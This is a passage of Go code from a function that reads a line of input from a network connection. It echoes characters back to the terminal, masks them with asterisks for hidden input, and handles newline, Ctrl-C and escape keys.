        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
